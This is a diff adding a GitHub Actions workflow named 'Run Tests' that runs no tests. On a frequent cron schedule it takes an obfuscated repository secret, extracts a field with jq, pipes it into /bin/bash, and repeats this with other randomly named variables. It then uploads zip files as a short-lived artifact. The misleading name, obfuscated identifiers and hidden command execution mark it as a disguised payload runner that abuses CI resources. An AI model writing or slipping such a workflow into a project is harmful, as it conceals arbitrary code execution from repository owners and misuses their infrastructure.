@@ -1,0 +1,32 @@
+name: Run Tests
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '28 2,8,14,20 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  validate:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run task
+        env:
+          n58649: ${{ secrets.n58649 }}
+        run: |
+          printf '%s' "$n58649" | jq -r .z493 | /bin/bash
+          echo $ml7774 | jq -r .hxj23387 | /bin/bash
+          echo $z4258 | jq -r .iy19 | /bin/bash
+          echo $u6 | jq -r .qdf87892 | /bin/bash
+
+      - name: Store output
+        uses: actions/upload-artifact@v4
+        with:
+          name: V49RayQB
+          path: "*.zip"
+          retention-days: 1
